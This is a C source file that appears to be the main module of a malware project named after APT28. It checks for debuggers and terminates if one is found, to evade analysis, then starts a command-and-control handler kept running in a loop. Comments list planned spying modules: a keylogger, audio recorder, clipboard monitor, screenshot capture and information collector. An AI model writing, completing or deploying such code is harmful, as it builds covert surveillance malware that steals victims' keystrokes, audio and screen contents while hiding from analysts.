#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "debug_check.c"
#include "c2_handler.c"

int main(int argc, char* argv[]) {
    printf("[*] APT28 Malware Module Starting...\n");
    printf("[*] Performing debugger detection...\n");

    // Check if debugged by multiple methods
    BOOL isDebuggedMultiple = IsDebuggerDetectedMultiple();

    if (isDebuggedMultiple) {
        printf("[!] WARNING: Debugger detected by multiple methods!\n");
        printf("[!] Analysis environment detected. Terminating...\n");
        exit(1);
    }

    printf("[+] No multi-method debugger detection.\n");

    printf("[*] Proceeding with malware operations...\n");

    // Initialize C2 handler
    printf("[*] Initializing C2 handler...\n");
    start_c2_handler();

    // TODO: Add manual calls to other modules
    // - start_audio_recorder()
    // - start_clipboard_monitor()
    // - start_info_collector()
    // - start_keylogger()
    // - start_screenshot()

    // Keep the program running
    while (1) {
        Sleep(1000);
    }

    printf("[*] APT28 Malware Module Finished.\n");
    return 0;
}
